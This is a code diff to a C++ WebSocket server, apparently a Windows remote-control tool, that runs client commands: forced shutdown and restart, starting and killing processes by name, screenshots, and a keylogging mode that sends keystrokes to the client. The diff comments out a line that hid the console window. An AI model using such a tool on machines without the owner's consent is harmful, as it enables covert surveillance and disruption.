@@ -22,6 +22,7 @@
 #include "../Application/StopApp.cpp"  // Chèn hàm tắt ứng dụng
 #include "../Process/Process.cpp"    // Chèn hàm liệt kê tiến trình đang chạy
 #include "../Process/StopProc.cpp" // Chèn hàm tắt tiến trình theo PID
+#include "../Process/StartProcName.cpp" // Chèn hàm khởi động tiến trình theo tên
 
 #include "../Screen Shot/ScreenShot.cpp" // Chèn hàm chụp màn hình
 
@@ -43,10 +44,12 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
     std::cout << "Received: " << received << std::endl;
     
     if (received == "shutdown") {
-        system("shutdown /s /t 0");
+		std::cout << "Shutting down..." << std::endl;
+        system("shutdown /s /f /t 0");
     }
     else if (received == "restart") {
-        system("shutdown /r /t 0");
+		std::cout << "Restarting..." << std::endl;
+        system("shutdown /r /f /t 0");
     }
     else if (received == "list_apps") {
         // Gọi hàm liệt kê ứng dụng và gửi kết quả về client
@@ -102,6 +105,33 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
         } 
         s->send(hdl, "Stopped process with PID: " + pid_str, msg->get_opcode());
     }
+
+    else if (received.rfind("stop_proc_name:", 0) == 0) {
+        std::string proc_name = received.substr(15); // Lấy tên tiến trình sau "stop_proc_name:"
+        bool flag = false;
+        f.push_back(std::async(std::launch::async, StopApplication, std::ref(proc_name), std::ref(flag)));
+        f.back().wait();
+        if (!flag) {
+            std::cout << "Failed to stop process: " << proc_name << std::endl;
+            s->send(hdl, "Failed to stop process: " + proc_name, msg->get_opcode());
+            return;
+        } 
+		s->send(hdl, "Stopped process: " + proc_name, msg->get_opcode());
+    }
+
+    else if (received.rfind("start_proc_name:", 0) == 0) {
+        std::string proc_name = received.substr(16); // Lấy tên tiến trình sau "start_proc_name:"
+        bool flag = false;
+		DWORD pid = 0;
+        f.push_back(std::async(std::launch::async, StartProcName, std::ref(proc_name), std::ref(flag), std::ref(pid)));
+        f.back().wait();
+        if (!flag) {
+            std::cerr << "Failed to start process: " << proc_name << std::endl;
+            s->send(hdl, "Failed to start process: " + proc_name, msg->get_opcode());
+            return;
+        } 
+        s->send(hdl, "Starting process: " + proc_name + ".exe with PID: " + std::to_string(pid), msg->get_opcode());
+	}
 
     else if (received == "screenshot") {
         // 1. Chụp màn hình và lưu vào file
@@ -202,7 +232,7 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
         s->send(hdl, "Keylogging started.", msg->get_opcode());
         keyLogFlag = true;
         auto fakeFunction = [s, hdl, received, msg](){
-            ShowWindow(GetConsoleWindow(), SW_HIDE);
+            //ShowWindow(GetConsoleWindow(), SW_HIDE);
             while (keyLogFlag) {
                 Sleep(10);
                 std::string output;
